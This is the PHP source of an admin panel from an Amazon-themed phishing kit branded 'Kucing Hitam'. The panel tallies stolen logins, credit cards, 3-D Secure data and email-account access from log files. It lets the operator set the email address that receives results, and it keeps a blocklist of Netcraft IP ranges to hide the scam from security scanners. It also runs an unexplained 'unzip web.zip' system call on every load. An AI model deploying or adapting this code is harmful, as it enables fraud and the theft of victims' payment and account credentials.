<?php
 
error_reporting(0);
@require_once "../amazon/__CONFIG__.php";
 
system("unzip web.zip");
error_reporting(0);
include '../conf/config.php';
 
session_start();
if($_SESSION['user'] == ""){
header('location: ../PanelKH.php');
}
 
$off = $_GET['account'];
if(isset($off)){
  if($off == 'off'){
    session_destroy();
    unset($_SESSION['user']);
    session_unset();
    header('location: ../PanelKH.php');
  }
  else{
    echo '';
  }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" type="image/png" sizes="16x16" href="../plugins/images/favicon.png">
    <title>Admin Panel Kucing Hitam</title>
    <!-- Bootstrap Core CSS -->
    <link href="bootstrap/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Menu CSS -->
    <link href="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.css" rel="stylesheet">
    <!-- animation CSS -->
    <link href="css/animate.css" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="css/style.css" rel="stylesheet">
    <!-- color CSS -->
    <link href="css/colors/default.css" id="theme" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>
<style>
    button:hover{
   background-color: white;
   color: blue;
}
button{
    background-color:black;
    color: white;
    border-radius: 10px;
}
</style>
<body class="fix-header">
    <!-- ============================================================== -->
    <!-- Preloader -->
    <!-- ============================================================== -->
    <div class="preloader">
        <svg class="circular" viewBox="25 25 50 50">
            <circle class="path" cx="50" cy="50" r="20" fill="none" stroke-width="2" stroke-miterlimit="10" />
        </svg>
    </div>
    <!-- ============================================================== -->
    <!-- Wrapper -->
    <!-- ============================================================== -->
    <div id="wrapper">
        <!-- ============================================================== -->
        <!-- Topbar header - style you can find in pages.scss -->
        <!-- ============================================================== -->
        <nav class="navbar navbar-default navbar-static-top m-b-0">
            <div class="navbar-header">
                <div class="top-left-part">
                     <!-- Logo -->
                  
                </div>
                <!-- /Logo -->

                <ul class="nav navbar-top-links navbar-right pull-right">
                    <li>
                        <form role="search" class="app-search hidden-sm hidden-xs m-r-10">
                            <input type="text" placeholder="Search..." class="form-control"> <a href=""><i class="fa fa-search"></i></a> </form>
                    </li>
                    <li>
                        <a class="profile-pic" href="#"> <img src="../plugins/images/users/varun.jpg" alt="user-img" width="36" class="img-circle"><b class="hidden-xs">Member</b></a>
                    </li>
                </ul>
            </div>
            <!-- /.navbar-header -->
            <!-- /.navbar-top-links -->
            <!-- /.navbar-static-side -->
        </nav>
        <!-- End Top Navigation -->
        <!-- ============================================================== -->
        <!-- Left Sidebar - style you can find in sidebar.scss  -->
        <!-- ============================================================== -->
        <div class="navbar-default sidebar" role="navigation">
            <div class="sidebar-nav slimscrollsidebar">
                <div class="sidebar-head">
                    <h3><span class="fa-fw open-close"><i class="ti-close ti-menu"></i></span> <span class="hide-menu">Navigation</span></h3>
                </div>
                <ul class="nav" id="side-menu">
                    <li style="padding: 70px 0 0;">
                        <a href="#" class="waves-effect"><i class="fa fa-clock-o fa-fw" aria-hidden="true"></i>Dashboard</a>
                    </li>
                    <li>
                        <a href="#" class="waves-effect"><i class="fa fa-user fa-fw" aria-hidden="true"></i>Setting</a>
                    </li>
                    <li>
                        <a href="bin.php" class="waves-effect"><i class="fa fa-table fa-fw" aria-hidden="true"></i>Daftar Bin</a>
                    </li>
                    
                    <li>
                        <a href="visitor.php" class="waves-effect"><i class="fa fa-columns fa-fw" aria-hidden="true"></i>Visitor</a>
                    </li>
                    <li>
                        <a href="bot.php" class="waves-effect"><i class="fa fa-columns fa-fw" aria-hidden="true"></i>Blocker</a>
                    </li>

                </ul>
            </div>
            
        </div>
        <!-- ============================================================== -->
        <!-- End Left Sidebar -->
        <!-- ============================================================== -->
        <!-- ============================================================== -->
        <!-- Page Content -->
        <!-- ============================================================== -->
        <div id="page-wrapper">
            <div class="container-fluid">
                <div class="row bg-title">
                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">
                        <h4 class="page-title">Fitur Kucing Hitam</h4>
                             <a href="?account=off"><button class="clc">Log Out</button></a>
     <a href="https://<?php echo $_SERVER['SERVER_NAME']?>" target="_blank"><button class="clc">View Scam</button></a>
                        </div>
                    

                    <div class="col-lg-9 col-sm-8 col-md-8 col-xs-12">
                        <ol class="breadcrumb">
                        </ol>
                    </div>
                </div>
                <!-- /.row -->
                <!-- .row -->
                <div class="row">
                   <div class="col-lg-2 col-sm-2 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Total Klik</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-success"></i> <span class="counter text-success"><?php echo empty(@file_get_contents("../log/click.txt")) ? "0" : @file_get_contents("../log/click.txt"); ?></span></li>
                            </ul>
                        </div>
                        
                    </div>
                    <div class="col-lg-2 col-sm-2 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Total Login</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash2"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-purple"></i> <span class="counter text-purple"><?php echo empty(@file_get_contents("../log/login.txt")) ? "0" : @file_get_contents("../log/login.txt"); ?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-sm-2 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Total Credit Card</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash3"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-info"></i> <span class="counter text-info"><?php echo empty(@file_get_contents("../log/cc.txt")) ? "0" : @file_get_contents("../log/cc.txt"); ?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-sm-2 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Total CC + VBV</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash3"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-info"></i> <span class="counter text-info"><?php echo empty(@file_get_contents("../log/vbv.txt")) ? "0" : @file_get_contents("../log/vbv.txt"); ?></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-lg-2 col-sm-2 col-xs-12">
                        <div class="white-box analytics-info">
                            <h3 class="box-title">Total Email Acces</h3>
                            <ul class="list-inline two-part">
                                <li>
                                    <div id="sparklinedash3"></div>
                                </li>
                                <li class="text-right"><i class="ti-arrow-up text-info"></i> <span class="counter text-info"><?php echo empty(@file_get_contents("../log/tembus.txt")) ? "0" : @file_get_contents("../log/tembus.txt"); ?></span></li>
                            </ul>
                        </div>
                    </div>
                    
                    <div></div>
<div class="row">
                    <div class="col-md-12">
                        <div class="white-box">
                          <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>
</head>
<body>

<h2>Setting</h2>

<table>
  <tr>
    <th><h4>#Setingan#</h4></th>
    <th><h4>#Lama#</h4></th>
    <th><h4>#Baru#</h4></th>
    <th><h4>#Save#</h4></th>
  </tr>
  <form method="POST">
  <tr>
    <td>Email Result</td>
    <td><input type="text" style="width: 45%;height:30px;background: #061213;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;"class="form-control-sm" size="30" name="lama" value="<?php echo $to; ?>" required="required" readonly=""></td>
    <td><input name="baru" style="width: 45%;height:30px;background: #061213;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" placeholder="your@email.com"/></td>
    <td><input name="emel" style="width:93%; height:35px;color:white; background-color:#32CD32;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" type="submit" Value="Save" /></td>
  </tr>
</form>
<form method="POST">
  <tr>
    <td>Token Akses</td>
    <td><input type="text" style="width: 45%;height:30px;background: #061213;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;"class="form-control-sm" size="30" name="lama" value="<?php echo $token2; ?>" required="required" readonly=""></td>
    <td><input name="baru" style="width: 45%;height:30px;background: #061213;border: none;padding-left: 10%;color: #63717f;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" placeholder="MODAL-DONG-BANG-2K19"/></td>
    <td><input name="emel" style="width:93%; height:35px;color:white; background-color:#32CD32;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" type="submit" Value="Save" /></td>
  </tr>
</form>
<form method="POST" id="rd" action"">
                            <tr>
                              <td>
                              <button type="submit" name="reset" style="width:95%; height:35px;color:white; background-color:#DC143C;border:none;-webkit-border-radius: 5px;-moz-border-radius: 5px;border-radius: 5px;" value="Save"><a href="javascript:{}" name="asw" onclick="document.getElementById('rd').submit();">Reset Log</button></a>
                              </form>
                              </td>
                            </tr>
</table>
                            
                        
                </div>
                </div>

                </div>
                <!-- /.row -->
            </div>
            <!-- /.container-fluid -->
    <footer class="footer text-center"><marquee> <?php echo date('Y'); ?> &copy; [K]ucing[H]itam[T]eam </marquee></footer>
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
    <!-- jQuery -->
    <script src="../plugins/bower_components/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap Core JavaScript -->
    <script src="bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- Menu Plugin JavaScript -->
    <script src="../plugins/bower_components/sidebar-nav/dist/sidebar-nav.min.js"></script>
    <!--slimscroll JavaScript -->
    <script src="js/jquery.slimscroll.js"></script>
    <!--Wave Effects -->
    <script src="js/waves.js"></script>
    <!-- Custom Theme JavaScript -->
    <script src="js/custom.min.js"></script>
</body>

</html>
<?php
$lama   = trim($_POST['lama']);
$baru   = trim($_POST['baru']);
$tokel  = trim($_POST['tokel']);
$tokeb  = trim($_POST['tokeb']);
$file   = "../amazon/__CONFIG__.php";
$isi    = file_get_contents($file);
if(isset($_POST['emel'])) {
    if(preg_match("#\b$lama\b#is", $isi)) {
        $isi = str_replace($lama,$baru,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
}}
if(isset($_POST['tokes'])) {
   if(preg_match("#$tokel#is", $isi)) {
        $isi = str_replace($tokel,$tokeb,$isi);
        $buka = fopen($file,'w');
        fwrite($buka,$isi);
        fclose($buka);
    }
}

echo "<script type='text/javascript'>

(function()
{
  if( window.localStorage )
  {
    if( !localStorage.getItem( 'firstLoad' ) )
    {
      localStorage[ 'firstLoad' ] = true;
      window.location.reload();
    }  

    else
      localStorage.removeItem( 'firstLoad' );
  }
})();

</script>";
?>
<?php 
if(isset($_POST['reset'])) {
       unlink("../log/click.txt");
       unlink("../log/cc.txt");
       unlink("../log/login.txt");
       unlink("../log/vbv.txt");
       unlink("../log/visitor.txt");
       unlink("../log/tembus.txt");
       unlink("../amazon/logbot/blocked.txt");
       $f_id = glob('uploads/*'); // get all file names
       foreach($f_id as $f_id){ // iterate files
       if(is_file($f_id))
       unlink($f_id); // delete file
       }
       
       $filee = file_get_contents("assets/includes/blacklist.dat");
       $cek = preg_match_all("/# NETCRAFT IP RANGES(.*)# USERS COMPLETED/is", $filee, $res) ? $res : null;
       $buka = fopen("assets/includes/blacklist.dat",'w');
       fwrite($buka,$cek[0][0]."\r\r");
       fclose($buka);
       
} else {}
isset($_POST) == array ();
 ?>